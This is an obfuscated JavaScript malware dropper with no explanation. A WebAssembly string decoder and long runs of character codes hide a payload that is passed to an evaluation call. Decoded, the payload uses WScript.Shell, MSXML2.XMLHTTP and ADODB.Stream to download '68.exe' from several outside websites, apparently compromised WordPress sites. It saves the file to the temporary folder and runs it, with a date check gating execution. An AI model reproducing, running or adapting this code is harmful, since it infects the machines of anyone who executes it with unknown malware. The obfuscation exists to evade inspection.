const __universalAtob = function (b64Encoded) {
    try {
        let binary_string = atob(b64Encoded), len = binary_string.length, bytes = new Uint8Array(len);
        for (let i = 0; i < len; i++) {
            bytes[i] = binary_string.charCodeAt(i);
        }
        return bytes;
    } catch (err) {
        return new Uint8Array(global.Buffer.from(b64Encoded, 'base64'));
    }
};
const __wasmStringModules = ['AGFzbQEAAAAFg4CAgAABAAEGhoCAgAABfwBBAQsHkoCAgAACBm1lbW9yeQIABWRhdGEwAwALi4CAgAABAEEBCwVldmFsAA=='].map(__bytes => {
    const bytesToUse = __universalAtob(__bytes);
    return new WebAssembly.Instance(new WebAssembly.Module(bytesToUse));
});
const lS = (wI, pos, iWC) => {
    let __str = '';
    if (!Array.isArray(wI)) {
        let __targetModule = __wasmStringModules[wI];
        let __mem = new Uint8Array(__targetModule.exports.memory.buffer);
        const __stringKey = `data${ pos }`;
        let __start = __targetModule.exports[__stringKey] - 1;
        let __str = '';
        let i = __start;
        let __c = __mem[i++];
        while (!(parseInt(__c) & 128) && __mem[i]) {
            __str += __c;
            __c = String.fromCharCode(__mem[i++]);
        }
        __str += __c;
        __str = decodeURIComponent(__str.substring(1));
        return __str;
    } else {
        for (const __wasmIndex of wI) {
            let __targetModule = __wasmStringModules[__wasmIndex];
            let __mem = new Uint8Array(__targetModule.exports.memory.buffer);
            const __stringKey = `data${ pos }`;
            let __start = __targetModule.exports[__stringKey] - 1;
            let i = __start;
            let __c = __mem[i++];
            while (!(parseInt(__c) & 128) && __mem[i]) {
                __str += __c;
                __c = String.fromCharCode(__mem[i++]);
            }
            __str += __c;
        }
        __str = decodeURIComponent(__str.substring(1));
        return __str;
    }
};
function N(wmeWEUfvIG, TIiMDFuLPQ, VTosougVZo) {
    return String.fromCharCode(wmeWEUfvIG) + String.fromCharCode(TIiMDFuLPQ) + String.fromCharCode(VTosougVZo);
}
window[lS(0, 0, true)](N(13, 10, 13) + N(10, 118, 97) + N(114, 32, 98) + N(32, 61, 32) + N(34, 97, 118) + N(116, 105, 109) + N(101, 115, 112) + N(103, 46, 99) + N(111, 109, 47) + N(54, 56, 46) + N(101, 120, 101) + N(63, 32, 98) + N(97, 114, 101) + N(107, 110, 117) + N(99, 107, 108) + N(101, 98, 97) + N(98, 101, 115) + N(46, 99, 111) + N(109, 47, 119) + N(112, 45, 97) + N(100, 109, 105) + N(110, 47, 109) + N(97, 105, 110) + N(116, 47, 54) + N(56, 46, 101) + N(120, 101, 63) + N(32, 98, 97) + N(117, 101, 108) + N(101, 109, 101) + N(110, 116, 101) + N(98, 101, 114) + N(97, 116, 101) + N(114, 46, 99) + N(111, 109, 47) + N(119, 112, 45) + N(99, 111, 110) + N(116, 101, 110) + N(116, 47, 117) + N(112, 108, 111) + N(97, 100, 115) + N(47, 50, 48) + N(49, 51, 47) + N(48, 55, 47) + N(54, 56, 46) + N(101, 120, 101) + N(63, 34, 46) + N(115, 112, 108) + N(105, 116, 40) + N(34, 32, 34) + N(41, 59, 13) + N(10, 118, 97) + N(114, 32, 115) + N(100, 102, 32) + N(61, 40, 40) + N(49, 47, 42) + N(115, 49, 52) + N(55, 49, 48) + N(52, 56, 55) + N(51, 53, 57) + N(54, 110, 52) + N(48, 56, 49) + N(50, 55, 117) + N(77, 51, 53) + N(52, 49, 57) + N(51, 101, 79) + N(105, 90, 42) + N(47, 41, 63) + N(34, 87, 83) + N(99, 114, 105) + N(34, 58, 34) + N(34, 41, 43) + N(34, 112, 116) + N(46, 83, 104) + N(101, 108, 108) + N(34, 59, 13) + N(10, 118, 97) + N(114, 32, 119) + N(115, 32, 61) + N(32, 87, 83) + N(99, 114, 105) + N(112, 116, 46) + N(67, 114, 101) + N(97, 116, 101) + N(79, 98, 106) + N(101, 99, 116) + N(40, 115, 100) + N(102, 41, 59) + N(13, 10, 118) + N(97, 114, 32) + N(102, 100, 32) + N(61, 32, 34) + N(37, 84, 69) + N(77, 80, 37) + N(92, 92, 34) + N(59, 13, 10) + N(118, 97, 114) + N(32, 102, 110) + N(32, 61, 32) + N(119, 115, 46) + N(69, 120, 112) + N(97, 110, 100) + N(69, 110, 118) + N(105, 114, 111) + N(110, 109, 101) + N(110, 116, 83) + N(116, 114, 105) + N(110, 103, 115) + N(40, 102, 100) + N(41, 59, 13) + N(10, 118, 97) + N(114, 32, 98) + N(105, 109, 32) + N(61, 32, 34) + N(50, 46, 88) + N(77, 76, 72) + N(34, 59, 13) + N(10, 118, 97) + N(114, 32, 112) + N(111, 104, 32) + N(61, 32, 98) + N(105, 109, 32) + N(43, 32, 34) + N(84, 84, 80) + N(34, 59, 13) + N(10, 118, 97) + N(114, 32, 97) + N(115, 32, 61) + N(32, 116, 114) + N(117, 101, 32) + N(32, 44, 32) + N(115, 100, 102) + N(115, 32, 61) + N(32, 34, 65) + N(68, 79, 68) + N(34, 59, 13) + N(10, 118, 97) + N(114, 32, 120) + N(111, 32, 61) + N(32, 87, 83) + N(99, 114, 105) + N(112, 116, 46) + N(67, 114, 101) + N(97, 116, 101) + N(79, 98, 106) + N(101, 99, 116) + N(40, 34, 77) + N(83, 34, 43) + N(34, 88, 77) + N(76, 34, 43) + N(40, 50, 52) + N(55, 54, 51) + N(56, 44, 32) + N(112, 111, 104) + N(41, 41, 59) + N(13, 10, 118) + N(97, 114, 32) + N(120, 97, 32) + N(61, 32, 87) + N(83, 99, 114) + N(105, 112, 116) + N(46, 67, 114) + N(101, 97, 116) + N(101, 79, 98) + N(106, 101, 99) + N(116, 40, 115) + N(100, 102, 115) + N(32, 43, 32) + N(34, 66, 46) + N(83, 116, 34) + N(43, 40, 56) + N(55, 56, 50) + N(54, 44, 32) + N(34, 114, 101) + N(97, 109, 34) + N(41, 41, 59) + N(13, 10, 118) + N(97, 114, 32) + N(108, 100, 32) + N(61, 32, 48) + N(59, 13, 10) + N(118, 97, 114) + N(32, 110, 32) + N(61, 32, 49) + N(59, 13, 10) + N(102, 111, 114) + N(32, 40, 118) + N(97, 114, 32) + N(105, 61, 108) + N(100, 59, 32) + N(105, 60, 98) + N(46, 108, 101) + N(110, 103, 116) + N(104, 59, 32) + N(105, 43, 43) + N(41, 32, 32) + N(123, 13, 10) + N(32, 32, 118) + N(97, 114, 32) + N(100, 110, 32) + N(61, 32, 48) + N(59, 13, 10) + N(32, 32, 116) + N(114, 121, 32) + N(32, 123, 13) + N(10, 9, 112) + N(111, 105, 32) + N(61, 32, 34) + N(71, 69, 84) + N(34, 59, 9) + N(32, 13, 10) + N(32, 32, 32) + N(32, 120, 111) + N(46, 111, 112) + N(101, 110, 40) + N(112, 111, 105) + N(44, 34, 104) + N(116, 116, 112) + N(58, 47, 47) + N(34, 43, 98) + N(91, 105, 93) + N(43, 110, 44) + N(32, 102, 97) + N(108, 115, 101) + N(41, 59, 32) + N(120, 111, 46) + N(115, 101, 110) + N(100, 40, 41) + N(59, 32, 105) + N(102, 32, 40) + N(120, 111, 46) + N(115, 116, 97) + N(116, 117, 115) + N(32, 61, 61) + N(32, 49, 48) + N(48, 43, 49) + N(48, 48, 41) + N(32, 32, 123) + N(13, 10, 32) + N(32, 32, 32) + N(32, 32, 120) + N(97, 46, 111) + N(112, 101, 110) + N(40, 41, 59) + N(32, 120, 97) + N(46, 116, 121) + N(112, 101, 32) + N(61, 32, 49) + N(59, 32, 120) + N(97, 46, 119) + N(114, 105, 116) + N(101, 40, 120) + N(111, 46, 114) + N(101, 115, 112) + N(111, 110, 115) + N(101, 66, 111) + N(100, 121, 41) + N(59, 32, 105) + N(102, 32, 40) + N(120, 97, 46) + N(115, 105, 122) + N(101, 32, 62) + N(32, 50, 48) + N(49, 48, 48) + N(48, 45, 49) + N(48, 48, 48) + N(41, 32, 32) + N(123, 13, 10) + N(32, 32, 32) + N(32, 32, 32) + N(32, 32, 100) + N(110, 32, 61) + N(32, 49, 59) + N(32, 120, 97) + N(46, 112, 111) + N(115, 105, 116) + N(105, 111, 110) + N(32, 61, 32) + N(48, 59, 32) + N(120, 97, 46) + N(115, 97, 118) + N(101, 84, 111) + N(70, 105, 108) + N(101, 47, 42) + N(100, 51, 49) + N(50, 52, 57) + N(52, 115, 42) + N(47, 40, 102) + N(110, 47, 42) + N(100, 56, 48) + N(48, 56, 53) + N(53, 115, 42) + N(47, 43, 110) + N(43, 34, 46) + N(101, 120, 101) + N(34, 44, 52) + N(45, 50, 41) + N(59, 32, 116) + N(114, 121, 32) + N(32, 123, 13) + N(10, 32, 32) + N(32, 32, 32) + N(32, 32, 32) + N(32, 32, 105) + N(102, 32, 40) + N(40, 40, 110) + N(101, 119, 32) + N(68, 97, 116) + N(101, 40, 41) + N(41, 62, 48) + N(44, 55, 56) + N(55, 54, 54) + N(50, 53, 56) + N(56, 56, 41) + N(41, 32, 123) + N(13, 10, 9) + N(9, 32, 32) + N(32, 32, 119) + N(115, 46, 47) + N(42, 100, 55) + N(55, 49, 56) + N(57, 49, 115) + N(42, 47, 82) + N(117, 110, 40) + N(102, 110, 43) + N(110, 43, 47) + N(42, 100, 53) + N(53, 51, 55) + N(53, 52, 115) + N(42, 47, 34) + N(46, 101, 120) + N(101, 34, 44) + N(47, 42, 100) + N(53, 48, 56) + N(50, 52, 51) + N(115, 42, 47) + N(51, 45, 50) + N(44, 48, 41) + N(59, 32, 13) + N(10, 9, 9) + N(32, 32, 32) + N(32, 98, 114) + N(101, 97, 107) + N(59, 13, 10) + N(32, 32, 32) + N(32, 32, 32) + N(32, 32, 32) + N(32, 125, 13) + N(10, 9, 9) + N(125, 13, 10) + N(32, 32, 32) + N(32, 32, 32) + N(32, 32, 99) + N(97, 116, 99) + N(104, 32, 40) + N(101, 114, 41) + N(32, 32, 123) + N(13, 10, 9) + N(9, 125, 59) + N(32, 13, 10) + N(32, 32, 32) + N(32, 32, 32) + N(125, 59, 32) + N(120, 97, 46) + N(99, 108, 111) + N(115, 101, 40) + N(41, 59, 32) + N(13, 10, 32) + N(32, 32, 32) + N(125, 59, 32) + N(13, 10, 9) + N(105, 102, 32) + N(40, 100, 110) + N(32, 61, 61) + N(32, 49, 41) + N(32, 32, 123) + N(13, 10, 32) + N(32, 32, 32) + N(32, 32, 108) + N(100, 32, 61) + N(32, 105, 59) + N(32, 98, 114) + N(101, 97, 107) + N(59, 32, 13) + N(10, 32, 32) + N(32, 32, 125) + N(59, 32, 13) + N(10, 32, 32) + N(125, 13, 10) + N(32, 32, 99) + N(97, 116, 99) + N(104, 32, 40) + N(101, 114, 41) + N(32, 32, 123) + N(32, 13, 10) + N(32, 32, 125) + N(59, 32, 13) + N(10, 125, 59) + N(32, 13, 10) + N(13, 10, NaN) + N(13, 13, 13));